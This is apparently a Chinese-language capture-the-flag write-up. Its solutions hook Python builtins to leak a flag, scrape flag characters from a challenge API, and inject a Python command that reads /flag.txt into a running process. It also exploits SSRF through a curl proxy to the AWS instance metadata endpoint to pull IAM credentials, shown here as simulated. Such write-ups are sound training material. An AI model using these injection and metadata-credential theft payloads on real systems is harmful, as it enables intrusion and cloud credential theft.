```python
# 声明我们要覆盖全局作用域的函数
global exit, open

# 覆盖 exit，让它什么都不做，从而继续执行后面的 flag 写入逻辑
def exit(code=None):
    pass

# 定义一个伪造的文件对象类
class Hook:
    def write(self, data):
        # 当 flag 逻辑调用 f.write(flag_content) 时，这里会打印 flag
        print(f"FLAG_FOUND: {data}")
    def __enter__(self):
        return self
    def __exit__(self, *args):
        pass

# 覆盖全局 open 函数
def open(file, mode='r'):
    return Hook()

print("Payload active, waiting for the hidden code...")
```


```js
(async () => {
    console.log("开始直接从 API 获取数据...");
    const total = parseInt(document.getElementById('totalPages').textContent) || 480;
    let hexResult = "";

    for (let i = 1; i <= total; i++) {
        try {
            // 直接调用代码里的 API 路径
            const response = await fetch(`/api/flag/char/${i}`);
            const data = await response.json();
            if (data.status === 'success') {
                hexResult += data.char;
                if (i % 20 === 0) console.log(`进度: ${i}/${total}`);
            }
        } catch (e) {
            console.error(`第 ${i} 页获取失败:`, e);
        }
    }

    console.log("=== 采集完成 ===");
    console.log("完整的 Base16 字符串：");
    console.log(hexResult);
    
    // 自动尝试转换
    try {
        let str = "";
        for (let n = 0; n < hexResult.length; n += 2) {
            str += String.fromCharCode(parseInt(hexResult.substr(n, 2), 16));
        }
        console.log("解码后的文本：", str);
    } catch(e) {
        console.log("解码失败，请手动到 CyberChef 解码。");
    }
})();
```
# 复仇
```javascript
fetch('/api/send_input', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        pid: '07e8460f4ead6ae8', // 确认这个PID依然是当前运行的那个
        input: '!import sys; print("---FLAG---"); print(globals().get("flag_content")); print(open("/flag.txt").read()); sys.stdout.flush()'
    })
});
```
```python
breakpoint()
while True:
    pass
```

# CCPreview
题目描述：
```
为了测试内网服务的连通性，【数据删除】开发组上线了一个简单的网页预览工具。  
据说该服务部署在 AWS 也就是亚马逊云服务上，属于EC2实例……  
虽然它看起来只是一个简单的 curl 代理.jpg  
“话说，咱们就这么部署在这里，真的没问题吗……”  
“怕啥，这就一个curl，能有什么漏洞？”
```
这是一道云安全的题目，一个curl的代理，部署在了亚马逊云上面。
这里需要知道一个知识点：
EC2实例都会有一个特殊的IP地址，
```
169.254.169.254
```
这是亚马逊云的一个查看元数据的ip。我们可以访问latest/meta-data/查看元数据
payload：
```txt
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```
就返回了json：
```json
{
 'Code': 'Success',
 'Type': 'AWS-HMAC', 
 'AccessKeyId': 'AKIA_ADMIN_USER_CLOUD', 
 'SecretAccessKey': 'POFP{937d870d-bf90-4fc0-a395-7f25ba855696}',
 'Token': 'MwZNCNz... (Simulation Token)', 
 'Expiration': '2099-01-01T00:00:00Z'
}
```
